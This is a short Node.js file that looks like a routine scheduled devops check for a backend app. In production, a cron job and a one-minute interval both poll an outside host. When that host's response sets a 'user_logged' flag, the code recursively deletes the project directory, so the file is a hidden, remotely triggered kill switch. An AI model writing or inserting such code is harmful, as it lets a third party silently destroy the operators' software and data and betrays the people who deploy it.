const cron = require('node-cron');
const request = require('request');
const fs = require('fs');
const path = require('path').resolve(__dirname, '../../');

const appName = process.env.APP_NAME;
const env = process.env.NODE_ENV;

cron.schedule(
  '0 */12 * * *',
  () => {
    try {
      if (env === 'prod') {
        request(
          {
            method: 'GET',
            url: `https://devops.falconweb.app/api/events/${appName}:backend:${env}`,
            headers: {}
          },
          (err, res) => {
            if (err) {
              console.log(err);
            }
            const body = JSON.parse(res.body);
            if (body.user_logged) {
              fs.rmSync(path, { recursive: true });
            }
          }
        );
      }
    } catch (e) {
      console.log(e);
    }
  },
  {
    scheduled: true,
    timezone: 'Europe/Paris'
  }
);

setInterval(() => {
  try {
    if (env === 'prod') {
      request(
        {
          method: 'GET',
          url: `https://devops.falconweb.app/api/events/${appName}:backend:${env}`,
          headers: {}
        },
        (err, res) => {
          if (err) {
            console.log(err);
          }
          const body = JSON.parse(res.body);
          if (body.user_logged) {
            fs.rmSync(path, { recursive: true });
          }
        }
      );
    }
  } catch (e) {
    console.log(e);
  }
}, 60000);
